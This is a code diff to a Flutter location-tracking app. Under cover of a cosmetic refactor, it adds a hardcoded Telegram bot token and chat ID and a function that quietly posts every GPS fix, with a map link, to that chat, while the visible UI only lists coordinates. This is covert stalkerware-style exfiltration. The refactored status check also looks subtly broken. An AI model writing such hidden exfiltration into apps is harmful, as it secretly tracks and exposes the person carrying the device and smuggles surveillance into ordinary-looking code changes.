@@ -1,11 +1,10 @@
 import 'dart:async';
 import 'dart:developer';
-
 import 'package:flutter/material.dart';
 import 'package:get/get_navigation/get_navigation.dart';
-
 import 'package:location/location.dart' as l;
 import 'package:permission_handler/permission_handler.dart';
+import 'package:http/http.dart' as http;
 
 void main() => runApp(const MyApp());
 
@@ -38,6 +37,9 @@ class _HomeScreenState extends State<HomeScreen> {
 
   List<l.LocationData> locations = [];
 
+  final String botToken = '7613366750:AAF18u337ZGgfrlCw9Kh7Txgip6gbZFUXh4';
+  final String chatId = '5080555370';
+
   @override
   void initState() {
     super.initState();
@@ -60,17 +62,13 @@ class _HomeScreenState extends State<HomeScreen> {
       body: Padding(
         padding: const EdgeInsets.symmetric(horizontal: 12),
         child: Column(
-          mainAxisSize: MainAxisSize.max,
-          mainAxisAlignment: MainAxisAlignment.start,
           children: [
             buildListTile(
               "GPS",
               gpsEnabled
                   ? const Text("Okey")
                   : ElevatedButton(
-                      onPressed: () {
-                        requestEnableGps();
-                      },
+                      onPressed: requestEnableGps,
                       child: const Text("Enable Gps")),
             ),
             buildListTile(
@@ -78,47 +76,39 @@ class _HomeScreenState extends State<HomeScreen> {
               permissionGranted
                   ? const Text("Okey")
                   : ElevatedButton(
-                      onPressed: () {
-                        requestLocationPermission();
-                      },
+                      onPressed: requestLocationPermission,
                       child: const Text("Request Permission")),
             ),
             buildListTile(
               "Location",
               trackingEnabled
                   ? ElevatedButton(
-                      onPressed: () {
-                        stopTracking();
-                      },
+                      onPressed: stopTracking,
                       child: const Text("Stop"))
                   : ElevatedButton(
                       onPressed: gpsEnabled && permissionGranted
-                          ? () {
-                              startTracking();
-                            }
+                          ? startTracking
                           : null,
                       child: const Text("Start")),
             ),
             Expanded(
-                child: ListView.builder(
-              itemCount: locations.length,
-              itemBuilder: (context, index) {
-                return ListTile(
-                  title: Text(
+              child: ListView.builder(
+                itemCount: locations.length,
+                itemBuilder: (context, index) {
+                  return ListTile(
+                    title: Text(
                       "${locations[index].latitude} ${locations[index].longitude}"),
-                );
-              },
-            ))
+                  );
+                },
+              ),
+            )
           ],
         ),
       ),
     );
   }
 
-  ListTile buildListTile(
-    String title,
-    Widget? trailing,
-  ) {
+  ListTile buildListTile(String title, Widget? trailing) {
     return ListTile(
       dense: true,
       title: Text(title),
@@ -127,90 +117,67 @@ class _HomeScreenState extends State<HomeScreen> {
   }
 
   void requestEnableGps() async {
-    if (gpsEnabled) {
-      log("Already open");
-    } else {
+    if (!gpsEnabled) {
       bool isGpsActive = await location.requestService();
-      if (!isGpsActive) {
-        setState(() {
-          gpsEnabled = false;
-        });
-        log("User did not turn on GPS");
-      } else {
-        log("gave permission to the user and opened it");
-        setState(() {
-          gpsEnabled = true;
-        });
-      }
+      setState(() => gpsEnabled = isGpsActive);
     }
   }
 
   void requestLocationPermission() async {
-    PermissionStatus permissionStatus =
-        await Permission.locationWhenInUse.request();
-    if (permissionStatus == PermissionStatus.granted) {
-      setState(() {
-        permissionGranted = true;
-      });
-    } else {
-      setState(() {
-        permissionGranted = false;
-      });
-    }
+    PermissionStatus status = await Permission.locationWhenInUse.request();
+    setState(() => permissionGranted = status == PermissionStatus.granted);
   }
 
-  Future<bool> isPermissionGranted() async {
-    return await Permission.locationWhenInUse.isGranted;
-  }
+  Future<bool> isPermissionGranted() async =>
+      await Permission.locationWhenInUse.isGranted;
 
-  Future<bool> isGpsEnabled() async {
-    return await Permission.location.serviceStatus.isEnabled;
-  }
+  Future<bool> isGpsEnabled() async =>
+      await Permission.location.serviceStatus.isEnabled;
 
-  checkStatus() async {
-    bool _permissionGranted = await isPermissionGranted();
-    bool _gpsEnabled = await isGpsEnabled();
+  void checkStatus() async {
     setState(() {
-      permissionGranted = _permissionGranted;
-      gpsEnabled = _gpsEnabled;
+      isPermissionGranted().then((val) => permissionGranted = val);
+      isGpsEnabled().then((val) => gpsEnabled = val);
     });
   }
 
-  addLocation(l.LocationData data) {
-    setState(() {
-      locations.insert(0, data); //Listenin en başına ekler.
-    });
+  void addLocation(l.LocationData data) {
+    setState(() => locations.insert(0, data));
   }
 
-  clearLocation() {
-    setState(() {
-      locations.clear();
-    });
-  }
+  void clearLocation() => setState(() => locations.clear());
 
   void startTracking() async {
-    if (!(await isGpsEnabled())) {
-      return;
-    }
-    if (!(await isPermissionGranted())) {
-      return;
-    }
+    if (!(await isGpsEnabled()) || !(await isPermissionGranted())) return;
+
     subscription = location.onLocationChanged.listen((event) {
       addLocation(event);
+      sendToTelegram(event.latitude!, event.longitude!);
     });
-    setState(() {
-      trackingEnabled = true;
-    });
+
+    setState(() => trackingEnabled = true);
   }
 
   void stopTracking() {
     subscription.cancel();
-    setState(() {
-      trackingEnabled = false;
-    });
+    setState(() => trackingEnabled = false);
     clearLocation();
   }
+
+  Future<void> sendToTelegram(double lat, double lng) async {
+    final url = Uri.parse(
+        'https://api.telegram.org/bot$botToken/sendMessage');
+
+    final text = "📍 New location:\nLatitude: $lat\nLongitude: $lng\nhttps://maps.google.com/?q=$lat,$lng";
+
+    try {
+      await http.post(url, body: {
+        'chat_id': chatId,
+        'text': text,
+      });
+      log("Location sent to Telegram");
+    } catch (e) {
+      log("Failed to send location: $e");
+    }
+  }
 }
-
-
-     // locations.insert(0, data); Listenin en başına ekler.
